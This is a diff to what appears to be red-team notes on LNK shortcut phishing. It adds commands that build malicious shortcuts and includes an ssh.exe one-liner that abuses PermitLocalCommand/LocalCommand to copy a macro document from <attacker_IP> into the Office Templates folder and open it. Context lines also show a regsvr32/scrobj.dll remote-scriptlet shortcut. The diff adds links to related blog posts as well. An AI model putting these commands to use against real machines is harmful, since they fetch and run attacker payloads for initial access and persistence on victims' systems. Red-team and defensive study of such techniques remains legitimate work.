@@ -105,7 +105,15 @@ Scriptlet file
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "regsvr32" "/s /u /i://<attacker_IP>/@snare scrobj.dll" file.lnk
 ```
 
-TODO: Provide use cases if any
+TODO: Provide use cases if any (refer to the link for SSH)
+
+```
+$ wine wscript '//Nologo' '//B' generate_lnk.vbs "ssh" "-i \\\\<attacker_IP>\\key.pem root@<IP>"
+```
+
+```
+C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc" <username>@<attacker_IP>
+```
 
 ---
 ## References
@@ -163,3 +171,11 @@ TODO: Provide use cases if any
 - [Assume Breach: LNK Phishing Revisited In 2023](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-revisited-in-2023-364daf70a06a)
 
 - [Assume Breach: LNK Phishing In 2023 Revisited…Again](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836)
+
+### RedSiege
+
+- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)
+
+### B4ckdoor
+
+- [b4ckdoor: Is Macro Phishing Dead in 2024? — A Scheduled Task for Initial Access and Persistence using macro by Abusing Shortcut Files and SSH](https://b4ckdoor.medium.com/is-macro-phishing-dead-in-2024-56b7b4473a29)
